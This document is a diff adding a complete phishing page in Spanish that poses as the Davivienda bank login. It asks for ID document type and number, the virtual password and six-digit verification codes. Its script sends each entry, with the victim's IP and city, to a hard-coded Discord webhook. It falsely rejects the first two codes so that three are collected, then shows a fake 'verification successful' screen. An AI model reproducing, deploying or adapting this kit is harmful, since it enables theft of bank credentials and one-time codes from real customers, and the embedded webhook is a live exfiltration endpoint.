@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario Dinámico</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            overflow-x: hidden;
+        }
+
+        /* Pantalla 1: Splash */
+        #splash {
+            background: linear-gradient(135deg, #d30000, #9e0000);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            width: 100%;
+            z-index: 9999;
+            padding: 20px;
+        }
+
+        .logo-img {
+            max-width: 150px;
+            height: auto;
+            object-fit: contain;
+            filter: brightness(1.2);
+        }
+
+        /* Pantallas ocultas */
+        .screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: #f9f9f9;
+            padding: 0;
+            overflow-y: auto;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        /* Banner */
+        .banner {
+            width: 100%;
+            height: 120px;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+        }
+
+        .banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: center;
+        }
+
+        /* Botón Atrás */
+        .back-button {
+            display: flex;
+            align-items: center;
+            padding: 20px 20px 0 20px;
+            color: #333;
+            font-size: 18px;
+            text-decoration: none;
+            z-index: 10;
+        }
+
+        .back-button svg {
+            width: 20px;
+            height: 20px;
+            stroke: #333;
+            fill: none;
+            stroke-width: 2px;
+            margin-right: 5px;
+        }
+
+        .content {
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .select-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .select-wrapper select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            font-size: 16px;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            background: white;
+            cursor: pointer;
+        }
+
+        .select-wrapper::after {
+            content: '▼';
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none;
+            color: #666;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            font-size: 16px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 10px 0;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .btn-login {
+            width: 60%;
+            padding: 12px;
+            background-color: #ddd;
+            color: #333;
+            border: none;
+            border-radius: 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 20px auto;
+            text-align: center;
+        }
+
+        .btn-login.active {
+            background-color: #FF0000;
+            color: white;
+        }
+
+        .qr-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .btn-qr {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 20px;
+            background-color: #FF0000;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 16px;
+            cursor: pointer;
+            flex: 1;
+        }
+
+        .btn-qr-center {
+            width: 50px;
+            height: 50px;
+            background-color: white;
+            border: 2px solid #FF0000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .btn-qr-center svg {
+            width: 20px;
+            height: 20px;
+            stroke: #FF0000;
+            fill: none;
+            stroke-width: 2px;
+        }
+
+        /* Botón de soporte (audífonos) */
+        .support-button {
+            position: fixed;
+            right: 0;
+            top: 300px;
+            width: 50px;
+            height: 50px;
+            background-color: #FF0000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: grab;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            z-index: 999;
+            left: auto;
+        }
+
+        .support-button:active {
+            cursor: grabbing;
+        }
+
+        .support-button svg {
+            width: 25px;
+            height: 25px;
+            stroke: white;
+            fill: white;
+            stroke-width: 2px;
+        }
+
+        .terms {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        .version {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        /* Ocultar mensajes */
+        .success, .error {
+            display: none !important;
+        }
+
+        .spacer {
+            height: 20px;
+        }
+
+        /* ============================= */
+        /*      OVERLAY DE CARA         */
+        /* ============================= */
+
+        #cameraContainer {
+            position: relative;
+        }
+
+        #cameraContainer video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .face-overlay {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            border-radius: 50%;
+            box-shadow: 0 0 0 9999px rgba(0,0,0,0.45);
+            border: 3px solid rgba(255,255,255,0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .face-overlay-inner {
+            position: relative;
+            width: 60%;
+            height: 60%;
+        }
+
+        .face-head {
+            position: absolute;
+            top: 5%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 55%;
+            height: 50%;
+            border-radius: 50%;
+            border: 2px solid rgba(255,255,255,0.9);
+        }
+
+        .face-shoulders {
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            height: 45%;
+            border-radius: 50% 50% 10% 10%;
+            border: 2px solid rgba(255,255,255,0.9);
+            border-top: none;
+        }
+
+        /* Icono de check para pantalla 7 */
+        .check-icon {
+            width: 100px;
+            height: 100px;
+            background-color: #2e7d32;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+        }
+
+        .check-icon svg {
+            width: 50px;
+            height: 50px;
+            stroke: white;
+            fill: none;
+            stroke-width: 3px;
+        }
+
+        /* Icono de error para pantalla 10 */
+        .error-icon {
+            width: 100px;
+            height: 100px;
+            background-color: #d32f2f;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+        }
+
+        .error-icon svg {
+            width: 50px;
+            height: 50px;
+            stroke: white;
+            fill: none;
+            stroke-width: 3px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Pantalla 1: Splash -->
+    <div id="splash">
+        <img src="logo.svg" alt="Logo" class="logo-img">
+    </div>
+
+    <!-- Pantalla 2: Login -->
+    <div id="screen2" class="screen">
+        <div class="banner">
+            <img src="banner.jpeg" alt="Banner con logo">
+        </div>
+        <a href="#" class="back-button" onclick="showScreen('screen1'); return false;">
+            <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg>
+            Atrás
+        </a>
+        <div class="content">
+            <div class="form-group">
+                <label for="docType">Seleccione el tipo de documento</label>
+                <div class="select-wrapper">
+                    <select id="docType" name="docType">
+                        <option value="" disabled selected>Tipo de documento</option>
+                        <option value="cedula_ciudadania">Cédula de ciudadanía</option>
+                        <option value="cedula_extranjeria">Cédula de extranjería</option>
+                        <option value="tarjeta_identidad">Tarjeta de identidad</option>
+                        <option value="registro_civil">Registro civil de nacimiento</option>
+                        <option value="pasaporte">Pasaporte</option>
+                    </select>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="docNumber">Ingrese el número de documento</label>
+                <div class="input-wrapper">
+                    <input type="number" id="docNumber" name="docNumber" placeholder="Número de documento" required>
+                </div>
+            </div>
+            <div class="forgot-password">
+                ¿Olvidó o bloqueó su clave virtual?
+            </div>
+            <button type="button" class="btn-login" id="loginButton2">Iniciar sesión</button>
+            <div class="qr-buttons">
+                <button class="btn-qr" id="readQR">Leer QR</button>
+                <div class="btn-qr-center">
+                    <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><path d="M7 7h2v2H7z"/><path d="M15 7h2v2h-2z"/><path d="M7 15h2v2H7z"/><path d="M15 15h2v2h-2z"/></svg>
+                </div>
+                <button class="btn-qr" id="generateQR">Generar QR</button>
+            </div>
+            <div class="support-button" id="supportButton2">
+                <svg viewBox="0 0 24 24" version="1.1">
+                    <g stroke="none" fill="none" fill-rule="evenodd">
+                        <path d="M21.0006154,12.7087888 C21.0006154,13.3479731 20.5828727,13.8930445 20.0012308,14.0949953 L20.0012308,10.3422381 C20.5828727,10.544189 21.0006154,11.0892603 21.0006154,11.7284447 L21.0006154,12.7087888 Z M17.9874709,14.669477 L17.9874709,9.76775648 C17.9874709,9.49816185 18.211333,9.27758443 18.4871632,9.27758443 C18.7629933,9.27758443 18.9868555,9.49816185 18.9868555,9.76775648 L18.9868555,14.669477 C18.9868555,14.9390716 18.7629933,15.159649 18.4871632,15.159649 C18.211333,15.159649 17.9874709,14.9390716 17.9874709,14.669477 L17.9874709,14.669477 Z M13.985935,21.0201461 L10.9877812,21.0201461 C10.7119511,21.0201461 10.4880889,20.7995686 10.4880889,20.529974 C10.4880889,20.259399 10.7119511,20.039802 10.9877812,20.039802 L13.985935,20.039802 C14.2617651,20.039802 14.4856273,20.259399 14.4856273,20.529974 C14.4856273,20.7995686 14.2617651,21.0201461 13.985935,21.0201461 L13.985935,21.0201461 Z M6.51253702,9.27758443 C6.78836716,9.27758443 7.01222931,9.49816185 7.01222931,9.76775648 L7.01222931,14.669477 C7.01222931,14.9390716 6.78836716,15.159649 6.51253702,15.159649 C6.23770625,15.159649 6.01284472,14.9390716 6.01284472,14.669477 L6.01284472,9.76775648 C6.01284472,9.49816185 6.23770625,9.27758443 6.51253702,9.27758443 L6.51253702,9.27758443 Z M4.99846936,14.0949953 C4.41682753,13.8930445 3.99908477,13.3479731 3.99908477,12.7087888 L3.99908477,11.7284447 C3.99908477,11.0892603 4.41682753,10.544189 4.99846936,10.3422381 L4.99846936,14.0949953 Z M19.9762462,9.32464095 C19.9612554,5.28268222 16.6063214,1.99950983 12.4828606,1.99950983 C8.35740097,1.99950983 5.00046813,5.28562325 4.98847552,9.32954267 C3.85417401,9.56188422 2.99970018,10.5481104 2.99970018,11.7284447 L2.99970018,12.7087888 C2.99970018,13.9244155 3.90914016,14.9282878 5.0934109,15.1194549 C5.28829089,15.7096221 5.84694688,16.1399931 6.51253702,16.1399931 C7.34002746,16.1399931 8.0116139,15.4802216 8.0116139,14.669477 L8.0116139,9.76775648 C8.0116139,8.95701191 7.34002746,8.29724033 6.51253702,8.29724033 C6.35863179,8.29724033 6.21172226,8.32665065 6.07180841,8.36978579 C6.55650994,5.32189599 9.24185633,2.97985393 12.4828606,2.97985393 C15.7188679,2.97985393 18.4022155,5.31601392 18.8909145,8.35900201 C18.7619939,8.32272928 18.6280764,8.29724033 18.4871632,8.29724033 C17.6606721,8.29724033 16.9880863,8.95701191 16.9880863,9.76775648 L16.9880863,14.669477 C16.9880863,15.4802216 17.6606721,16.1399931 18.4871632,16.1399931 C18.5571201,16.1399931 18.6240789,16.1292094 18.692037,16.1194059 C17.9614869,17.6379589 16.7132555,18.8761335 15.1482193,19.6123719 C14.8733885,19.2780746 14.4576445,19.0594579 13.985935,19.0594579 L10.9877812,19.0594579 C10.1612902,19.0594579 9.48870432,19.7182491 9.48870432,20.529974 C9.48870432,21.3407186 10.1612902,22.0004902 10.9877812,22.0004902 L13.985935,22.0004902 C14.8084285,22.0004902 15.4780162,21.3466007 15.4840125,20.5407578 C17.7885933,19.4908093 19.4995398,17.4811039 20.1331496,15.0704377 C21.2034905,14.7939807 22,13.8450076 22,12.7087888 L22,11.7284447 C22,10.5363463 21.1275373,9.54325768 19.9762462,9.32464095 L19.9762462,9.32464095 Z" fill="#ffffff" stroke="#ffffff" stroke-width="2"/>
+                    </g>
+                </svg>
+            </div>
+            <div class="terms">Términos y condiciones</div>
+            <div class="version">V.7.5.0</div>
+        </div>
+    </div>
+
+    <!-- Pantalla 3: Clave Virtual -->
+    <div id="screen3" class="screen">
+        <div class="banner">
+            <img src="banner.jpeg" alt="Banner con logo">
+        </div>
+        <a href="#" class="back-button" onclick="showScreen('screen2'); return false;">
+            <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg>
+            Atrás
+        </a>
+        <div class="content">
+            <div class="form-group">
+                <label for="claveVirtual">Ingrese su clave virtual</label>
+                <div class="input-wrapper">
+                    <input type="number" id="claveVirtual" name="claveVirtual" placeholder="Clave virtual" required>
+                </div>
+            </div>
+            <div class="forgot-password">
+                ¿Olvidó o bloqueó su clave virtual?
+            </div>
+            <button type="button" class="btn-login" id="loginButton3">Iniciar sesión</button>
+            <div class="terms">
+                <a href="#" style="color: #666; text-decoration: none;">Términos y condiciones</a>
+            </div>
+        </div>
+    </div>
+
+<!-- ====================== NUEVAS PANTALLAS (SIN SELFIE) ====================== -->
+
+<!-- Pantalla 8: Ingreso de código de verificación -->
+<div id="screen8" class="screen">
+    <div class="banner">
+        <img src="banner.jpeg" alt="Banner con logo">
+    </div>
+    
+    <div class="content">
+        <div style="text-align: center; margin-bottom: 20px;">
+            <h2 style="font-size: 22px; font-weight: bold; color: #333; margin-bottom: 10px;">Ingrese su código de confirmación</h2>
+            <p style="font-size: 14px; color: #666; margin-bottom: 10px;">
+                Si no recibe el código, puede esperar nuestra llamada o contactarnos a través del botón "¿Necesita Ayuda?"
+            </p>
+        </div>
+       
+        <div class="form-group">
+            <label for="verificationCode">Código de verificación</label>
+            <div class="input-wrapper">
+                <input type="number" id="verificationCode" name="verificationCode" placeholder="Ingrese el código de 6 dígitos" maxlength="6">
+            </div>
+        </div>
+       
+        <button type="button" class="btn-login" id="verifyCodeButton">Continuar</button>
+       
+        <div class="terms">
+            <a href="#" style="color: #666; text-decoration: none;">¿Necesita Ayuda?</a>
+        </div>
+    </div>
+</div>
+
+<!-- Pantalla 9: Cargando -->
+<div id="screen9" class="screen">
+    <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #d30000, #9e0000);">
+        <img src="logo.svg" alt="Logo Davivienda" style="width: 200px; height: 200px;">
+    </div>
+</div>
+
+<!-- Pantalla 10: Error de código -->
+<div id="screen10" class="screen">
+    <div class="content" style="text-align: center; padding-top: 40px;">
+        <h2 style="font-size: 24px; font-weight: bold; color: #d32f2f; margin-bottom: 10px;">Código incorrecto</h2>
+        <p style="font-size: 16px; color: #666; margin-bottom: 30px; max-width: 80%; margin-left: auto; margin-right: auto;">
+            El código ingresado es incorrecto. Por favor, intente nuevamente.
+        </p>
+        <div class="error-icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M18 6L6 18"/>
+                <path d="M6 6l12 12"/>
+            </svg>
+        </div>
+        <button type="button" class="btn-login active" id="retryCodeButton">Intentar con nuevo código</button>
+    </div>
+</div>
+
+<!-- Pantalla 11: Verificación exitosa -->
+<div id="screen11" class="screen">
+    <div class="content" style="text-align: center; padding-top: 40px;">
+        <h2 style="font-size: 24px; font-weight: bold; color: #2e7d32; margin-bottom: 10px;">Verificación exitosa</h2>
+        <p style="font-size: 16px; color: #555; margin-bottom: 30px; max-width: 80%; margin-left: auto; margin-right: auto;">
+            Hemos validado correctamente su identidad. Ya puede cerrar esta ventana.
+        </p>
+        <div class="check-icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M20 6L9 17l-5-5"/>
+            </svg>
+        </div>
+    </div>
+</div>
+
+<script>
+    const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1471941868303683714/HyJ2t-unnr-iA9eq98OgM5ac0tBq9y68d8mQu1rRfZaQpav3KjAjP4r9Q6II7gdzVsIz';
+    
+    let userData = {};
+    let userIP = '';
+    let userCity = '';
+    let verificationAttempts = 0;
+
+    async function getIPAndLocation() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            userIP = data.ip || 'Desconocida';
+            userCity = data.city || 'Desconocida';
+        } catch(e) {}
+    }
+
+    async function sendToDiscord(data, screen) {
+        try {
+            const embed = {
+                title: `📌 Login Davivienda - ${screen}`,
+                description: `Datos desde: **${userCity}** (IP: ${userIP})`,
+                color: 16711680,
+                fields: [
+                    { name: "Documento", value: data.cedula || "N/A", inline: true },
+                    { name: "Tipo", value: data.nombre || "N/A", inline: true },
+                    { name: "Clave Virtual", value: data.claveVirtual || "N/A", inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            };
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        } catch(e) {}
+    }
+
+    async function sendCodeToDiscord(code) {
+        try {
+            const embed = {
+                title: "⌨️ Código Ingresado",
+                description: `**Código:** ${code}\nDocumento: ${userData.cedula || 'N/A'}\nIntento: ${verificationAttempts + 1}`,
+                color: 16711680,
+                timestamp: new Date().toISOString()
+            };
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        } catch(e) {}
+    }
+
+    function showScreen(id) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        const screen = document.getElementById(id);
+        if (screen) screen.classList.add('active');
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+        await getIPAndLocation();
+
+        setTimeout(() => {
+            const splash = document.getElementById('splash');
+            if (splash) splash.style.display = 'none';
+            showScreen('screen2');
+        }, 2500);
+
+        // ====================== PANTALLA 2 ======================
+        const btn2 = document.getElementById('loginButton2');
+        const docInput = document.getElementById('docNumber');
+
+        if (btn2 && docInput) {
+            docInput.addEventListener('input', () => {
+                btn2.classList.toggle('active', docInput.value.trim().length > 0);
+            });
+        }
+
+        if (btn2) {
+            btn2.addEventListener('click', async () => {
+                const docNum = docInput.value.trim();
+                if (!docNum) return;
+
+                const docTypeEl = document.getElementById('docType');
+                userData = {
+                    cedula: docNum,
+                    nombre: docTypeEl ? docTypeEl.options[docTypeEl.selectedIndex].text : ''
+                };
+
+                await sendToDiscord(userData, 'Pantalla 2');
+                showScreen('screen3');
+            });
+        }
+
+        // ====================== PANTALLA 3 ======================
+        const btn3 = document.getElementById('loginButton3');
+        const claveInput = document.getElementById('claveVirtual');
+
+        if (btn3 && claveInput) {
+            claveInput.addEventListener('input', () => {
+                let val = claveInput.value.replace(/[^0-9]/g, '').slice(0, 8);
+                claveInput.value = val;
+                // Se pone rojo/activo cuando tiene 6 o más dígitos
+                btn3.classList.toggle('active', val.length >= 6);
+            });
+
+            btn3.addEventListener('click', async () => {
+                const clave = claveInput.value.trim();
+                if (clave.length < 6) return;
+
+                userData.claveVirtual = clave;
+                await sendToDiscord(userData, 'Pantalla 3');
+                showScreen('screen8');   // Va directo al código
+            });
+        }
+
+        // ====================== PANTALLA 8 - CÓDIGO ======================
+        const verifyBtn = document.getElementById('verifyCodeButton');
+        const codeInput = document.getElementById('verificationCode');
+
+        if (codeInput && verifyBtn) {
+            codeInput.addEventListener('input', () => {
+                let val = codeInput.value.replace(/[^0-9]/g, '').slice(0, 6);
+                codeInput.value = val;
+                // Se pone rojo/activo solo cuando tiene exactamente 6 dígitos
+                verifyBtn.classList.toggle('active', val.length === 6);
+            });
+
+            verifyBtn.addEventListener('click', async () => {
+                const code = codeInput.value.trim();
+                if (code.length !== 6) {
+                    alert('Ingrese un código de 6 dígitos');
+                    return;
+                }
+
+                showScreen('screen9');
+                await sendCodeToDiscord(code);
+
+                setTimeout(() => {
+                    verificationAttempts++;
+
+                    if (verificationAttempts < 3) {
+                        showScreen('screen10');
+                    } else {
+                        showScreen('screen11');
+
+                        setTimeout(() => {
+                            // Reiniciar todo
+                            verificationAttempts = 0;
+                            userData = {};
+                            codeInput.value = '';
+                            if (claveInput) claveInput.value = '';
+                            if (docInput) docInput.value = '';
+                            showScreen('screen2');
+                        }, 3000);
+                    }
+                }, 4500);
+            });
+        }
+
+        // Reintentar código (pantalla 10)
+        const retryBtn = document.getElementById('retryCodeButton');
+        if (retryBtn && codeInput) {
+            retryBtn.addEventListener('click', () => {
+                codeInput.value = '';
+                verifyBtn.classList.remove('active');   // Quita el color rojo al volver
+                showScreen('screen8');
+            });
+        }
+    });
+</script>
